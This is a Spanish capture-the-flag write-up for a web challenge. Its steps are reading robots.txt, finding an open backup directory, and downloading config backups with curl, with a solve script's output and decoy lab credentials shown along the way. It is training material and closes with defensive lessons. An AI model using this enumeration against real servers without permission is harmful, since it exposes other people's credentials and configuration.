# Desafío 46 — Portal de acceso clínico (robots.txt + backups expuestos)

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / exposición de información (reconocimiento) |
| Dificultad | fácil |
| Objetivo | `http://203.0.113.10:8001` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> El SICH tiene un portal de ingreso para el personal. Antes de 1994 nadie pensaba en esconder archivos del servidor web; hoy sí, pero a veces se esconden en el lugar equivocado. ¿Qué dejó olvidado el administrador?

La referencia a **1994** es el nacimiento de `robots.txt` (y del *Robots Exclusion Protocol*): una
convención para pedir a los buscadores que no indexen rutas, que **no oculta nada** a un humano.

## Reconocimiento

- `GET /` → portal de login (`u`, `p`) en Flask/gunicorn. Dos comentarios HTML:
  - `credenciales de respaldo tecnico/Hosp2029 se desactivaron tras la auditoria` → señuelo.
  - `pendiente: RWwgcmVzcGFsZG8gYnVlbm8gbm8gZXMgZWwgZGUgZWplbXBsby4gU2lndWUgcmV2aXNhbmRvIGVsIGRpcmVjdG9yaW8u`
    → Base64: «El respaldo bueno no es el de ejemplo. Sigue revisando el directorio.»
- `GET /robots.txt`:

  ```
  User-agent: *
  Disallow: /panel-admin/
  Disallow: /phpmyadmin/
  Disallow: /respaldo-sich/
  ```

- `/panel-admin/` → 403 «el panel administrativo se migro a la intranet en 2029».
  `/phpmyadmin/` → 404. `/respaldo-sich/` → **listado de directorio abierto**.

## Análisis

`robots.txt` no protege: solo enumera. El directorio `respaldo-sich` queda listado y contiene:

| Archivo | Fecha | Pista |
|---|---|---|
| `config.sample.bak` (212 B) | 2028-07-02 | «(plantilla de ejemplo)» |
| `sich.conf.bak` (198 B) | 2031-03-14 | sin etiqueta, el más reciente |

Contenido:

```ini
# config.sample.bak  -> SEÑUELO
# ARCHIVO DE EJEMPLO - plantilla de configuracion (NO usar en produccion)
db_user=sich_demo
db_pass=cambiar_en_produccion
token_integracion=flag{ejemplo}
```

```ini
# sich.conf.bak  -> REAL
# Respaldo de configuracion SICH - NO PUBLICAR
db_host=10.20.0.5
db_user=sich_svc
db_pass=********
entorno=produccion
token_integracion=flag{ejemplo}
```

Señuelos descartados:

- `tecnico` / `Hosp2029` → «Acceso denegado :: usuario o clave incorrectos» (desactivadas).
- `/panel-admin/` → 403 intencional, sin nada útil.
- `config.sample.bak` → flag de ejemplo explícitamente inválida, como anticipa el comentario en
  Base64 («el respaldo bueno no es el de ejemplo»).

## Solución (pasos reproducibles)

```bash
# 1) robots.txt anuncia los directorios "prohibidos"
curl -s http://203.0.113.10:8001/robots.txt

# 2) El directorio de respaldos esta listado
curl -s http://203.0.113.10:8001/respaldo-sich/

# 3) Descargar el respaldo de produccion (no la plantilla)
curl -s http://203.0.113.10:8001/respaldo-sich/sich.conf.bak
```

Automatizado: `python scripts/solve.py` (lee `robots.txt`, lista `respaldo-sich/`, descarga los
`.bak`, descarta el marcado como ejemplo y guarda la flag en `flag.txt`).

```text
[*] robots.txt: Disallow: /panel-admin/ · /phpmyadmin/ · /respaldo-sich/
[*] respaldos encontrados: ['/respaldo-sich/config.sample.bak', '/respaldo-sich/sich.conf.bak']
[*] /respaldo-sich/config.sample.bak (senuelo): flag{ejemplo}
[*] /respaldo-sich/sich.conf.bak (produccion): flag{ejemplo}
[+] FLAG: flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **`robots.txt` es un mapa, no un control de acceso.** Todo lo que aparece en `Disallow` es
  candidato directo de enumeración.
- Los respaldos (`*.bak`, `*.old`, `*.zip`, `*.sql`, `~`) nunca deben quedar bajo el *document root*
  ni con listado de directorio habilitado. Mejor: fuera del webroot, permisos por rol y sin índice.
- Diferenciar **plantilla de ejemplo vs. configuración real**: la fecha, la ausencia de la etiqueta
  «ejemplo» y la coherencia (`entorno=produccion`, host interno) delatan el archivo bueno.
- Los comentarios HTML y la codificación Base64 son pistas de recon, no controles: no deben contener
  credenciales reales.
- Evidencia del intercambio HTTP en `evidence/` (inicio con comentarios, `robots.txt`, listado,
  ambos `.bak` y el intento de login con las credenciales «desactivadas»).
